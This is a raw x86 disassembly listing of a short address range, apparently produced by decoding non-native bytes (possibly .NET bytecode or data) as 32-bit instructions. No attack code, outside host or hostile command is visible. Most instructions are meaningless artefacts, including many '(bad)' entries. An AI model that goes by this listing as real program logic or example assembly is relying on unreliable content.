11005a02:	or     al,BYTE PTR [eax]
11005a04:	and    BYTE PTR [ecx],al
11005a06:	add    BYTE PTR [eax],al
11005a08:	add    BYTE PTR [ebx],dl
11005a0a:	push   es
11005a0b:	sub    esi,DWORD PTR [ebp+0x16032b17]
11005a11:	sub    eax,DWORD PTR [eax]
11005a13:	sub    al,0x0
11005a15:	sub    eax,DWORD PTR [eax]
11005a17:	fmul   QWORD PTR [eax]
11005a19:	sub    al,BYTE PTR [eax]
11005a1b:	add    BYTE PTR [ecx],al
11005a1d:	adc    BYTE PTR [eax],al
11005a1f:	add    BYTE PTR [edx],al
11005a21:	add    BYTE PTR [ebx],ch
11005a23:	add    BYTE PTR [ecx+0x5800ac],al
11005a29:	add    BYTE PTR [eax],al
11005a2b:	add    BYTE PTR [ebx],dl
11005a2d:	xor    BYTE PTR [edx],al
11005a2f:	add    BYTE PTR [esi],ah
11005a31:	add    BYTE PTR [eax],al
11005a33:	add    BYTE PTR [ebx],dl
11005a35:	add    BYTE PTR [eax],al
11005a37:	adc    DWORD PTR [edi],edx
11005a39:	sub    eax,DWORD PTR [ebx]
11005a3b:	push   ss
11005a3c:	sub    eax,DWORD PTR [eax]
11005a3e:	sub    al,0x0
11005a40:	add    BYTE PTR [eax],ch
11005a42:	sbb    eax,DWORD PTR [eax]
11005a44:	add    BYTE PTR [edx],cl
11005a46:	or     al,BYTE PTR [ebx]
11005a48:	sub    BYTE PTR [eax+eax*1],ah
11005a4b:	add    BYTE PTR [esi],al
11005a4d:	or     eax,DWORD PTR [edx]
11005a4f:	pop    es
11005a50:	jae    0x11005acf
11005a52:	add    BYTE PTR [eax],al
11005a54:	or     cl,BYTE PTR [eax+ecx*1]
11005a57:	outs   dx,DWORD PTR ds:[esi]
11005a58:	jae    0x11005a5a
11005a5a:	add    BYTE PTR [edx],cl
11005a5c:	sub    al,BYTE PTR es:[eax]
11005a5f:	add    BYTE PTR [ebx],bl
11005a61:	xor    BYTE PTR [edx],al
11005a63:	add    bh,cl
11005a65:	add    BYTE PTR [eax],al
11005a67:	add    BYTE PTR [eax+eax*1],dl
11005a6a:	add    BYTE PTR [ecx],dl
11005a6c:	push   ss
11005a6d:	adc    ecx,DWORD PTR [ecx]
11005a6f:	adc    DWORD PTR [ecx],ecx
11005a71:	inc    ebp
11005a72:	add    DWORD PTR [eax],eax
11005a74:	add    BYTE PTR [eax],al
11005a76:	add    BYTE PTR [eax],al
11005a78:	add    BYTE PTR [eax],al
11005a7a:	pop    ss
11005a7b:	sub    eax,DWORD PTR [ebx]
11005a7d:	push   ss
11005a7e:	sub    eax,DWORD PTR [eax]
11005a80:	sub    al,0x0
11005a82:	add    BYTE PTR [edx+ecx*1],dl
11005a85:	adc    al,0xb
11005a87:	sub    ecx,DWORD PTR [ecx]
11005a89:	add    BYTE PTR [esi],al
11005a8b:	adc    eax,DWORD PTR [edi]
11005a8d:	cmp    BYTE PTR [esi+0x0],ah
11005a93:	jb     0x11005a86
11005a95:	add    al,0x0
11005a97:	jo     0x11005ab1
11005a99:	jae    0x11005b19
11005a9b:	add    BYTE PTR [eax],al
11005a9d:	or     cl,BYTE PTR [eax+ecx*1]
11005aa0:	sub    BYTE PTR [edi+0x0],bh
11005aa3:	add    BYTE PTR [edx],cl
11005aa5:	or     eax,0x8073
11005aaa:	or     dl,BYTE PTR [ebx]
11005aac:	add    al,0x9
11005aae:	outs   dx,DWORD PTR ds:[esi]
11005aaf:	add    DWORD PTR [eax],0x82730a00
11005ab5:	add    BYTE PTR [eax],al
11005ab7:	or     cl,BYTE PTR [ebx]
11005ab9:	adc    DWORD PTR [edi+eax*1],eax
11005abc:	outs   dx,DWORD PTR ds:[esi]
11005abd:	add    DWORD PTR [eax],0x0
11005ac0:	or     al,BYTE PTR [eax]
11005ac2:	adc    DWORD PTR [edx+eax*1],eax
11005ac5:	sub    BYTE PTR ds:0x60000,ah
11005acb:	jae    0x11005a51
11005acd:	add    BYTE PTR [eax],al
11005acf:	or     dl,BYTE PTR [ebx]
11005ad1:	add    eax,0x85730511
11005ad6:	add    BYTE PTR [eax],al
11005ad8:	or     dl,BYTE PTR [ebx]
11005ada:	push   es
11005adb:	adc    DWORD PTR [ecx+edx*1],eax
11005ade:	push   es
11005adf:	outs   dx,DWORD PTR ds:[esi]
11005ae0:	xchg   BYTE PTR [eax],al
11005ae2:	add    BYTE PTR [edx],cl
11005ae4:	add    BYTE PTR [ecx],dl
11005ae6:	add    eax,0x876f
11005aeb:	or     cl,BYTE PTR [edx]
11005aed:	add    dh,bl
11005aef:	cdq    
11005af0:	sub    edx,DWORD PTR [ebx]
11005af2:	adc    DWORD PTR [ecx],ecx
11005af4:	inc    ebp
11005af5:	add    eax,DWORD PTR [eax]
11005af7:	add    BYTE PTR [eax],al
11005af9:	adc    BYTE PTR [eax],al
11005afb:	add    BYTE PTR [eax],al
11005afd:	das    
11005afe:	add    BYTE PTR [eax],al
11005b00:	add    BYTE PTR ds:0x0,bl
11005b06:	pop    es
11005b07:	adc    al,0xfe
11005b09:	add    DWORD PTR [ebx],edx
11005b0b:	or     BYTE PTR [eax],ah
11005b0d:	add    BYTE PTR [eax],al
11005b0f:	add    BYTE PTR [eax],al
11005b11:	adc    ecx,DWORD PTR [ecx]
11005b13:	sub    ebx,ebp
11005b15:	adc    DWORD PTR [eax],ecx
11005b17:	sub    eax,0x2201d
11005b1c:	add    BYTE PTR [eax],al
11005b1e:	adc    ecx,DWORD PTR [ecx]
11005b20:	sub    edx,eax
11005b22:	sub    eax,DWORD PTR [eax]
11005b24:	pop    es
11005b25:	outs   dx,DWORD PTR ds:[esi]
11005b26:	mov    BYTE PTR [eax],al
11005b28:	add    BYTE PTR [edx],cl
11005b2a:	add    BYTE PTR [eax],ah
11005b2c:	add    DWORD PTR [eax],eax
11005b2e:	add    BYTE PTR [eax],al
11005b30:	adc    ecx,DWORD PTR [ecx]
11005b32:	sub    edi,DWORD PTR [esi-0x23ffffd5]
11005b38:	adc    DWORD PTR [edi],eax
11005b3a:	sub    al,BYTE PTR [eax]
11005b3c:	add    DWORD PTR [eax],edx
11005b3e:	add    BYTE PTR [eax],al
11005b40:	add    al,BYTE PTR [eax]
11005b42:	add    BYTE PTR es:[esi-0x7c],bl
11005b46:	add    BYTE PTR [eax+0x0],cl
11005b49:	add    BYTE PTR [eax],al
11005b4b:	add    BYTE PTR [ebx],bl
11005b4d:	xor    BYTE PTR [edx],al
11005b4f:	add    BYTE PTR [esi+0x2],bh
11005b52:	add    BYTE PTR [eax],al
11005b54:	adc    eax,0x16110000
11005b59:	adc    ecx,DWORD PTR [eax]
11005b5b:	adc    DWORD PTR [eax],ecx
11005b5d:	inc    ebp
11005b5e:	add    DWORD PTR [eax],eax
11005b60:	add    BYTE PTR [eax],al
11005b62:	add    BYTE PTR [eax],al
11005b64:	add    BYTE PTR [eax],al
11005b66:	pop    ss
11005b67:	sub    eax,DWORD PTR [ebx]
11005b69:	push   ss
11005b6a:	sub    eax,DWORD PTR [eax]
11005b6c:	sub    al,0x0
11005b6e:	add    BYTE PTR [eax],ch
11005b70:	sbb    eax,DWORD PTR [eax]
11005b72:	add    BYTE PTR [edx],cl
11005b74:	or     al,BYTE PTR [edx]
11005b76:	jb     0x11005b93
11005b78:	add    eax,0x896f7000
11005b7d:	add    BYTE PTR [eax],al
11005b7f:	or     cl,BYTE PTR [ebx]
11005b81:	add    BYTE PTR [edi],al
11005b83:	outs   dx,DWORD PTR ds:[esi]
11005b84:	mov    al,BYTE PTR [eax]
11005b86:	add    BYTE PTR [edx],cl
11005b88:	adc    eax,DWORD PTR ds:0x620002b
11005b8e:	add    BYTE PTR [eax],al
11005b90:	add    BYTE PTR [ebx],dl
11005b92:	or     BYTE PTR [ebx],ch
11005b94:	add    ch,BYTE PTR [ebx]
11005b96:	dec    edi
11005b97:	adc    DWORD PTR [eax],ecx
11005b99:	inc    ebp
11005b9a:	adc    al,BYTE PTR [eax]
11005b9c:	add    BYTE PTR [eax],al
11005b9e:	out    dx,eax
11005b9f:	add    BYTE PTR [eax],al
11005ba1:	add    dh,al
11005ba3:	add    BYTE PTR [eax],al
11005ba5:	add    BYTE PTR [edi],dl
11005ba7:	add    BYTE PTR [eax],al
11005ba9:	add    BYTE PTR [esi],bl
11005bab:	add    DWORD PTR [eax],eax
11005bad:	add    BYTE PTR [edx-0x6effffff],cl
11005bb3:	add    BYTE PTR [eax],al
11005bb5:	add    BYTE PTR [edi-0x1000001],ch
11005bbb:	add    BYTE PTR [eax],al
11005bbd:	add    BYTE PTR [edi+0x0],cl
11005bc0:	add    BYTE PTR [eax],al
11005bc2:	(bad)  
11005bc3:	add    BYTE PTR [eax],al
11005bc5:	add    BYTE PTR [ecx+eax*1+0x0],cl
11005bc9:	add    BYTE PTR [edx+0x0],ah
11005bcc:	add    BYTE PTR [eax],al
11005bce:	jp     0x11005bd0
11005bd0:	add    BYTE PTR [eax],al
11005bd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
11005bd3:	add    BYTE PTR [eax],al
11005bd5:	add    BYTE PTR [esi],ah
11005bd7:	add    BYTE PTR [eax],al
11005bd9:	add    BYTE PTR [ebx+0x77000001],bl
11005bdf:	add    DWORD PTR [eax],eax
11005be1:	add    BYTE PTR [edi+0x1],bl
11005be4:	add    BYTE PTR [eax],al
11005be6:	cmp    BYTE PTR [edi+0x0],dh
11005be9:	add    BYTE PTR [eax],al
11005beb:	add    BYTE PTR [eax],ch
11005bed:	and    al,BYTE PTR [eax]
11005bef:	add    BYTE PTR [esi],al
11005bf1:	adc    eax,DWORD PTR [eax+eax*1]
11005bf4:	and    BYTE PTR [edx],al
11005bf6:	add    BYTE PTR [eax],al
11005bf8:	add    BYTE PTR [ebx],dl
11005bfa:	or     BYTE PTR [ebx],ch
11005bfc:	call   0x0:0x14838
11005c03:	and    BYTE PTR [esi],cl
11005c05:	add    BYTE PTR [eax],al
11005c07:	add    BYTE PTR [ebx],dl
11005c09:	or     BYTE PTR [ebx],ch
11005c0b:	mov    ebp,DWORD PTR [ebx]
11005c0d:	push   esp
11005c0e:	add    BYTE PTR [ecx],cl
11005c10:	outs   dx,DWORD PTR ds:[esi]
11005c11:	add    BYTE PTR ss:[eax],al
11005c14:	or     cl,BYTE PTR ds:0x9041314
11005c1a:	jb     0x11005c4b
11005c1c:	add    eax,0x156f7000
11005c21:	add    BYTE PTR [eax],al
11005c23:	or     dl,BYTE PTR [esi]
11005c25:	inc    BYTE PTR [ecx]
11005c27:	adc    eax,DWORD PTR [esi]
11005c29:	and    BYTE PTR [eax],cl
11005c2b:	add    BYTE PTR [eax],al
11005c2d:	add    BYTE PTR [ebx],dl
11005c2f:	or     BYTE PTR [eax],bh
11005c31:	(bad)  
11005c32:	(bad)  
11005c33:	(bad)  
11005c34:	call   DWORD PTR [ecx]
11005c36:	push   es
11005c37:	cmp    al,BYTE PTR [edx+0x20000000]
11005c3d:	or     eax,DWORD PTR [eax]
11005c3f:	add    BYTE PTR [eax],al
11005c41:	adc    ecx,DWORD PTR [eax]
11005c43:	cmp    BYTE PTR [edi-0x1],cl
11005c46:	(bad)  
11005c47:	jmp    FWORD PTR [ebx]
11005c49:	mov    eax,ds:0x6f041108
11005c4e:	mov    eax,DWORD PTR [eax]
11005c50:	add    BYTE PTR [edx],cl
11005c52:	add    BYTE PTR [eax],al
11005c54:	and    BYTE PTR [eax+eax*1],cl
11005c57:	add    BYTE PTR [eax],al
11005c59:	adc    ecx,DWORD PTR [eax]
11005c5b:	cmp    BYTE PTR [edi],dh
11005c5d:	(bad)  
11005c5e:	(bad)  
11005c5f:	jmp    FWORD PTR [ebx]
11005c61:	jne    0x11005c74
11005c63:	add    eax,0x4f6f
11005c68:	or     dl,BYTE PTR [ebx]
11005c6a:	push   es
11005c6b:	and    BYTE PTR ds:0x13000000,al
11005c71:	or     BYTE PTR [eax],bh
11005c73:	and    bh,bh
11005c75:	(bad)  
11005c76:	call   DWORD PTR [ecx]
11005c78:	push   es
11005c79:	cmp    cl,BYTE PTR [ebx+0x20000000]
11005c7f:	or     eax,0x13000000
11005c84:	or     BYTE PTR [eax],bh
11005c86:	or     eax,0x38ffffff
11005c8b:	out    0x0,al
11005c8d:	add    BYTE PTR [eax],al
11005c8f:	add    BYTE PTR [ecx],cl
11005c91:	jb     0x11005cea
11005c93:	add    eax,0x8c287000
11005c98:	add    BYTE PTR [eax],al
11005c9a:	or     dl,BYTE PTR [esi]
11005c9c:	inc    BYTE PTR [ecx]
11005c9e:	adc    eax,DWORD PTR [esi]
11005ca0:	and    BYTE PTR [ecx],al
11005ca2:	add    BYTE PTR [eax],al
11005ca4:	add    BYTE PTR [ebx],dl
11005ca6:	or     BYTE PTR [eax],bh
11005ca8:	jmp    0x11005ca8
11005caa:	(bad)  
11005cab:	call   DWORD PTR [ecx]
11005cad:	push   es
11005cae:	sub    eax,0x9209a
11005cb3:	add    BYTE PTR [eax],al
11005cb5:	adc    ecx,DWORD PTR [eax]
11005cb7:	cmp    bl,bl
11005cb9:	(bad)  
11005cba:	(bad)  
11005cbb:	jmp    FWORD PTR [ebx]
11005cbd:	sub    eax,DWORD PTR [eax]
11005cbf:	push   es
11005cc0:	or     DWORD PTR [edi+0x1c],ebp
11005cc3:	add    BYTE PTR [eax],al
11005cc5:	or     dl,BYTE PTR [ebx]
11005cc7:	add    al,0x0
11005cc9:	and    BYTE PTR [eax],al
11005ccb:	add    BYTE PTR [eax],al
11005ccd:	add    BYTE PTR [ebx],dl
11005ccf:	or     BYTE PTR [eax],bh
11005cd1:	ret    0xfffe
11005cd4:	jmp    FWORD PTR [ebx]
11005cd6:	jae    0x11005cd8
11005cd8:	and    BYTE PTR [edi],al
11005cda:	add    BYTE PTR [eax],al
11005cdc:	add    BYTE PTR [ebx],dl
11005cde:	or     BYTE PTR [eax],bh
11005ce0:	mov    bl,0xfe
11005ce2:	(bad)  
11005ce3:	(bad)  
11005ce4:	cmp    BYTE PTR [ecx],bl
11005ce6:	(bad)  
11005ce7:	(bad)  
11005ce8:	call   DWORD PTR [ecx]
11005cea:	add    al,0x3
11005cec:	outs   dx,DWORD PTR ds:[esi]
11005ced:	lea    eax,[eax]
11005cef:	add    BYTE PTR [edx],cl
11005cf1:	sub    BYTE PTR [ecx+0x0],bh
11005cf4:	add    BYTE PTR [edx],cl
11005cf6:	adc    eax,DWORD PTR [eax+eiz*1]
11005cf9:	add    eax,DWORD PTR [eax]
11005cfb:	add    BYTE PTR [eax],al
11005cfd:	adc    ecx,DWORD PTR [eax]
11005cff:	cmp    BYTE PTR [ebx+0x38fffffe],dl
11005d05:	inc    ecx
11005d06:	(bad)  
11005d07:	(bad)  
11005d08:	call   DWORD PTR [ecx]
11005d0a:	add    eax,0x506f
11005d0f:	or     dh,BYTE PTR [esp+eax*2+0x0]
11005d13:	add    BYTE PTR [ecx],al
11005d15:	or     al,0x0
11005d17:	or     BYTE PTR [edi-0x72],ch
11005d1a:	add    BYTE PTR [eax],al
11005d1c:	or     cl,BYTE PTR ds:0x8f2809
11005d22:	add    BYTE PTR [edx],cl
11005d24:	adc    eax,DWORD PTR [esi]
11005d26:	and    BYTE PTR [edx],cl
11005d28:	add    BYTE PTR [eax],al
11005d2a:	add    BYTE PTR [ebx],dl
11005d2c:	or     BYTE PTR [eax],bh
11005d2e:	gs (bad) 
11005d30:	(bad)  
11005d31:	call   DWORD PTR [ecx]
11005d33:	push   es
11005d34:	cmp    cl,cl
11005d36:	(bad)  
11005d37:	(bad)  
11005d38:	jmp    DWORD PTR [eax]
11005d3a:	adc    DWORD PTR [eax],eax
11005d3c:	add    BYTE PTR [eax],al
11005d3e:	adc    ecx,DWORD PTR [eax]
11005d40:	cmp    BYTE PTR [edx-0x2],dl
11005d43:	(bad)  
11005d44:	(bad)  
11005d45:	cmp    ah,al
11005d47:	(bad)  
11005d48:	(bad)  
11005d49:	call   DWORD PTR [ecx]
11005d4b:	add    al,0x14
11005d4d:	inc    BYTE PTR [ecx]
11005d4f:	adc    eax,DWORD PTR [esi]
11005d51:	and    BYTE PTR [eax],dl
11005d53:	add    BYTE PTR [eax],al
11005d55:	add    BYTE PTR [ebx],dl
11005d57:	or     BYTE PTR [eax],bh
11005d59:	cmp    bh,dh
11005d5b:	(bad)  
11005d5c:	call   DWORD PTR [ecx]
11005d5e:	push   es
11005d5f:	cmp    dh,BYTE PTR [ebx-0x1]
11005d62:	(bad)  
11005d63:	jmp    DWORD PTR [eax]
11005d65:	add    al,0x0
11005d67:	add    BYTE PTR [eax],al
11005d69:	adc    ecx,DWORD PTR [eax]
11005d6b:	cmp    BYTE PTR [edi],ah
11005d6d:	(bad)  
11005d6e:	(bad)  
11005d6f:	(bad)  
11005d70:	cmp    BYTE PTR [edx],bl
11005d72:	(bad)  
11005d73:	(bad)  
11005d74:	jmp    DWORD PTR [eax]
11005d76:	sldt   WORD PTR [eax]
11005d79:	add    BYTE PTR [ebx],dl
11005d7b:	or     BYTE PTR [eax],bh
11005d7d:	push   ss
11005d7e:	(bad)  
11005d7f:	(bad)  
11005d80:	(bad)  
11005d81:	ficom  WORD PTR [ecx+0x2b]
11005d84:	adc    edx,DWORD PTR [ecx]
11005d86:	or     BYTE PTR [ebp+0x3],al
11005d89:	add    BYTE PTR [eax],al
11005d8b:	add    BYTE PTR [esi],ah
11005d8d:	add    BYTE PTR [eax],al
11005d8f:	add    BYTE PTR [ecx],bh
11005d91:	add    BYTE PTR [eax],al
11005d93:	add    BYTE PTR [ecx],bl
11005d95:	add    BYTE PTR [eax],al
11005d97:	add    BYTE PTR [ecx],dl
11005d99:	add    eax,0x2a75
11005d9e:	add    DWORD PTR [ebx],edx
11005da0:	pop    es
11005da1:	adc    DWORD PTR [edi],eax
11005da3:	adc    al,0xfe
11005da5:	add    DWORD PTR [ebx],edx
11005da7:	push   es
11005da8:	and    BYTE PTR [edx],al
11005daa:	add    BYTE PTR [eax],al
11005dac:	add    BYTE PTR [ebx],dl
11005dae:	or     BYTE PTR [ebx],ch
11005db0:	aam    0x11
11005db2:	push   es
11005db3:	sub    eax,0x201e
11005db8:	add    BYTE PTR [eax],al
11005dba:	adc    ecx,DWORD PTR [eax]
11005dbc:	sub    eax,edi
11005dbe:	sub    eax,DWORD PTR [eax]
11005dc0:	adc    DWORD PTR [edi],eax
11005dc2:	outs   dx,DWORD PTR ds:[esi]
11005dc3:	push   esp
11005dc4:	add    BYTE PTR [eax],al
11005dc6:	or     al,BYTE PTR [eax]
11005dc8:	and    BYTE PTR [ecx],al
11005dca:	add    BYTE PTR [eax],al
11005dcc:	add    BYTE PTR [ebx],dl
11005dce:	or     BYTE PTR [ebx],ch
11005dd0:	mov    ah,0x2b
11005dd2:	add    ah,bl
11005dd4:	add    BYTE PTR [edx],ch
11005dd6:	add    BYTE PTR [eax],al
11005dd8:	inc    ecx
11005dd9:	sbb    al,0x0
11005ddb:	add    BYTE PTR [edx],al
11005ddd:	add    BYTE PTR [eax],al
11005ddf:	add    BYTE PTR [eax+eax*1],dh
11005de2:	add    BYTE PTR [eax],al
11005de4:	test   DWORD PTR [ecx],0x22b0000
11005dea:	add    BYTE PTR [eax],al
11005dec:	push   ecx
11005ded:	add    BYTE PTR [eax],al
11005def:	add    BYTE PTR [eax],al
11005df1:	add    BYTE PTR [eax],al
11005df3:	add    BYTE PTR [ebx],dl
11005df5:	xor    BYTE PTR [edx],al
11005df7:	add    BYTE PTR [ecx],dh
11005df9:	add    BYTE PTR [eax],al
11005dfb:	add    BYTE PTR [esi],dl
11005dfd:	add    BYTE PTR [eax],al
11005dff:	adc    DWORD PTR [edi],edx
11005e01:	sub    eax,DWORD PTR [ebx]
11005e03:	push   ss
11005e04:	sub    eax,DWORD PTR [eax]
11005e06:	sub    al,0x0
11005e08:	add    BYTE PTR [ebx-0x70],dh
11005e0b:	add    BYTE PTR [eax],al
11005e0d:	or     cl,BYTE PTR [edx]
11005e0f:	add    ch,BYTE PTR [edi-0x6f]
11005e12:	add    BYTE PTR [eax],al
11005e14:	or     al,BYTE PTR [esi]
11005e16:	outs   dx,DWORD PTR ds:[esi]
11005e17:	xchg   edx,eax
11005e18:	add    BYTE PTR [eax],al
11005e1a:	or     al,BYTE PTR [eax]
11005e1c:	push   es
11005e1d:	jle    0x11005db2
11005e1f:	add    BYTE PTR [eax],al
11005e21:	or     ch,BYTE PTR [edi-0x6c]
11005e24:	add    BYTE PTR [eax],al
11005e26:	or     cl,BYTE PTR [ebx]
11005e28:	add    al,BYTE PTR [edi]
11005e2a:	outs   dx,DWORD PTR ds:[esi]
11005e2b:	xchg   ebp,eax
11005e2c:	add    BYTE PTR [eax],al
11005e2e:	or     al,BYTE PTR [eax]
11005e30:	sub    al,BYTE PTR [eax]
11005e32:	add    BYTE PTR [eax],al
11005e34:	adc    esi,DWORD PTR [eax]
11005e36:	add    DWORD PTR [eax],eax
11005e38:	or     al,BYTE PTR [eax]
11005e3a:	add    BYTE PTR [eax],al
11005e3c:	add    BYTE PTR [eax],al
11005e3e:	add    BYTE PTR [eax],al
11005e40:	add    ch,BYTE PTR [eax]
11005e42:	adc    al,BYTE PTR [eax]
11005e44:	add    BYTE PTR [edx],cl
11005e46:	add    BYTE PTR [eax],al
11005e48:	add    BYTE PTR [edx],ch
11005e4a:	add    BYTE PTR [eax],al
11005e4c:	sbb    esi,DWORD PTR [eax]
11005e4e:	pop    es
11005e4f:	add    BYTE PTR [eax],dl
11005e51:	add    al,0x0
11005e53:	add    BYTE PTR [edi],dl
11005e55:	add    BYTE PTR [eax],al
11005e57:	adc    DWORD PTR [eax],esp
11005e59:	pop    es
11005e5a:	add    BYTE PTR [eax],al
11005e5c:	add    dh,bh
11005e5e:	push   cs
11005e5f:	adc    al,BYTE PTR [eax]
11005e61:	push   ss
11005e62:	adc    edx,DWORD PTR [ecx]
11005e64:	adc    DWORD PTR [ecx],edx
11005e66:	inc    ebp
11005e67:	add    DWORD PTR [eax],eax
11005e69:	add    BYTE PTR [eax],al
11005e6b:	add    BYTE PTR [eax],al
11005e6d:	add    BYTE PTR [eax],al
11005e6f:	sub    edx,DWORD PTR [ebx+0x11]
11005e72:	adc    DWORD PTR [ebp+0x13],eax
11005e75:	add    BYTE PTR [eax],al
11005e77:	add    al,bl
11005e79:	add    DWORD PTR [eax],eax
11005e7b:	add    BYTE PTR [edi+0x0],cl
11005e7e:	add    BYTE PTR [eax],al
11005e80:	add    DWORD PTR [ecx],0x0
11005e83:	add    BYTE PTR [edx+0x1],bl
11005e86:	add    BYTE PTR [eax],al
11005e88:	fwait
11005e89:	add    eax,DWORD PTR [eax]
11005e8b:	add    ch,dh
11005e8d:	add    DWORD PTR [eax],eax
11005e8f:	add    BYTE PTR [edi+0x3],ch
11005e92:	add    BYTE PTR [eax],al
11005e94:	pop    esp
11005e95:	add    eax,DWORD PTR [eax]
11005e97:	add    BYTE PTR [edi],dl
11005e99:	add    BYTE PTR [eax],al
11005e9b:	add    BYTE PTR ds:0x88000001,ch
11005ea1:	add    eax,DWORD PTR [eax]
11005ea3:	add    BYTE PTR [edi],ah
11005ea5:	add    BYTE PTR [eax],al
11005ea7:	add    al,cl
11005ea9:	add    DWORD PTR [eax],eax
11005eab:	add    BYTE PTR [ebx+0x0],bh
11005eae:	add    BYTE PTR [eax],al
11005eb0:	push   0x54000000
11005eb5:	add    al,BYTE PTR [eax]
11005eb7:	add    BYTE PTR [ebx],bh
11005eb9:	add    al,BYTE PTR [eax]
11005ebb:	add    BYTE PTR [esi+0x16000001],ah
11005ec1:	add    al,BYTE PTR [eax]
11005ec3:	add    BYTE PTR [eax],al
11005ec5:	add    ch,BYTE PTR [eax]
11005ec7:	and    BYTE PTR [eax],al
11005ec9:	add    BYTE PTR [esi],al
11005ecb:	or     al,BYTE PTR [esi]
11005ecd:	adc    al,0xfe
11005ecf:	add    DWORD PTR [ebx],edx
11005ed1:	adc    BYTE PTR [eax],ah
11005ed3:	or     BYTE PTR [eax],al
11005ed5:	add    BYTE PTR [eax],al
11005ed7:	adc    edx,DWORD PTR [ecx]
11005ed9:	sub    edx,DWORD PTR [esi+0x223a1011]
11005edf:	add    al,BYTE PTR [eax]
11005ee1:	add    BYTE PTR [eax],ah
11005ee3:	or     eax,DWORD PTR [eax]
11005ee5:	add    BYTE PTR [eax],al
11005ee7:	adc    edx,DWORD PTR [ecx]
11005ee9:	sub    eax,DWORD PTR [esi+0x1ec38]
11005eef:	add    BYTE PTR [edi],al
11005ef1:	outs   dx,DWORD PTR ds:[esi]
11005ef2:	xor    al,BYTE PTR [eax]
11005ef4:	add    BYTE PTR [esi],al
11005ef6:	adc    DWORD PTR [eax],ecx
11005ef8:	outs   dx,DWORD PTR ds:[esi]
11005ef9:	xchg   edi,eax
11005efa:	add    BYTE PTR [eax],al
11005efc:	or     cl,BYTE PTR [eax]
11005efe:	sub    BYTE PTR [ecx],ah
11005f00:	add    BYTE PTR [eax],al
11005f02:	push   es
11005f03:	add    BYTE PTR [edi],dl
11005f05:	adc    ecx,DWORD PTR [edi]
11005f07:	and    BYTE PTR [ecx],al
11005f09:	add    BYTE PTR [eax],al
11005f0b:	add    BYTE PTR [ebx],dl
11005f0d:	adc    DWORD PTR [eax],edi
11005f0f:	pop    esi
11005f10:	(bad)  
11005f11:	(bad)  
11005f12:	(bad)  
11005f13:	cmp    BYTE PTR [ebx+eax*1+0x0],cl
11005f17:	add    BYTE PTR [eax],al
11005f19:	adc    DWORD PTR [eax],ecx
11005f1b:	adc    al,0xfe
11005f1d:	add    DWORD PTR [ebx],edx
11005f1f:	adc    BYTE PTR [eax],ah
11005f21:	push   cs
11005f22:	add    BYTE PTR [eax],al
11005f24:	add    BYTE PTR [ebx],dl
11005f26:	adc    DWORD PTR [eax],edi
11005f28:	inc    ebp
11005f29:	(bad)  
11005f2a:	(bad)  
11005f2b:	call   DWORD PTR [ecx]
11005f2d:	adc    BYTE PTR [edx],bh
11005f2f:	fiadd  DWORD PTR [edx]
11005f31:	add    BYTE PTR [eax],al
11005f33:	and    BYTE PTR ds:0x13000000,cl
11005f39:	adc    DWORD PTR [eax],edi
11005f3b:	xor    bh,bh
11005f3d:	(bad)  
11005f3e:	(bad)  
11005f3f:	cmp    ah,dh
11005f41:	add    al,BYTE PTR [eax]
11005f43:	add    BYTE PTR [eax],al
11005f45:	sub    BYTE PTR [ecx],ch
11005f47:	add    BYTE PTR [eax],al
11005f49:	push   es
11005f4a:	add    BYTE PTR [edx],al
11005f4c:	sub    BYTE PTR [ebx],ch
11005f4e:	add    BYTE PTR [eax],al
11005f50:	push   es
11005f51:	jae    0x11005eeb
11005f53:	add    BYTE PTR [eax],al
11005f55:	or     dl,BYTE PTR [ebx]
11005f57:	add    eax,0x996f0511
11005f5c:	add    BYTE PTR [eax],al
11005f5e:	or     cl,BYTE PTR [eax+eax*1]
11005f61:	fstp   QWORD PTR [eax+0x1]
11005f64:	add    BYTE PTR [eax],al
11005f66:	adc    eax,DWORD PTR [edi]
11005f68:	add    BYTE PTR [ecx],dl
11005f6a:	push   es
11005f6b:	jb     0x11005fe8
11005f6d:	add    eax,0xcfe7000
11005f72:	adc    al,BYTE PTR [eax]
11005f74:	sub    BYTE PTR ds:0x6f060000,bl
11005f7a:	sbb    al,0x0
11005f7c:	add    BYTE PTR [edx],cl
11005f7e:	sub    BYTE PTR [ebx],dh
11005f80:	add    BYTE PTR [eax],al
11005f82:	or     al,BYTE PTR [eax]
11005f84:	adc    DWORD PTR [edi],eax
11005f86:	outs   dx,DWORD PTR ds:[esi]
11005f87:	xchg   edi,eax
11005f88:	add    BYTE PTR [eax],al
11005f8a:	or     ch,BYTE PTR [eax]
11005f8c:	xor    eax,DWORD PTR [eax]
11005f8e:	add    BYTE PTR [edx],cl
11005f90:	add    BYTE PTR [edi],dl
11005f92:	adc    ecx,DWORD PTR [edi]
11005f94:	(bad)  
11005f96:	add    al,BYTE PTR [eax]
11005f98:	add    BYTE PTR [esi],ah
11005f9a:	add    BYTE PTR [ecx],dl
11005f9c:	push   es
11005f9d:	jb     0x1100601a
11005f9f:	add    eax,0xcfe7000
11005fa4:	adc    al,BYTE PTR [eax]
11005fa6:	sub    BYTE PTR ds:0x6f060000,bl
11005fac:	sbb    al,0x0
11005fae:	add    BYTE PTR [edx],cl
11005fb0:	sub    BYTE PTR [ebx],dh
11005fb2:	add    BYTE PTR [eax],al
11005fb4:	or     al,BYTE PTR [eax]
11005fb6:	pop    ss
11005fb7:	adc    ecx,DWORD PTR [edi]
11005fb9:	frstor [esi+0x17000002]
11005fbf:	sub    eax,DWORD PTR [ebx]
11005fc1:	push   ss
11005fc2:	sub    eax,DWORD PTR [eax]
11005fc4:	sub    al,0x0
11005fc6:	add    BYTE PTR [ecx],dl
11005fc8:	push   es
11005fc9:	jb     0x11006046
11005fcb:	add    eax,0xcfe7000
11005fd0:	adc    al,BYTE PTR [eax]
11005fd2:	sub    BYTE PTR ds:0x6f060000,bl
11005fd8:	sbb    al,0x0
11005fda:	add    BYTE PTR [edx],cl
11005fdc:	sub    BYTE PTR [ebx],dh
11005fde:	add    BYTE PTR [eax],al
11005fe0:	or     al,BYTE PTR [eax]
11005fe2:	pop    ss
11005fe3:	adc    ecx,DWORD PTR [edi]
11005fe5:	and    BYTE PTR [ecx],cl
11005fe7:	add    BYTE PTR [eax],al
11005fe9:	add    BYTE PTR [ebx],dl
11005feb:	adc    DWORD PTR [eax],edi
11005fed:	cmp    dh,0xff
11005ff0:	(bad)  
11005ff1:	cmp    BYTE PTR [esi+0x2],ch
11005ff4:	add    BYTE PTR [eax],al
11005ff6:	push   es
11005ff7:	jae    0x1100602c
11005ff9:	add    BYTE PTR [eax],al
11005ffb:	push   es
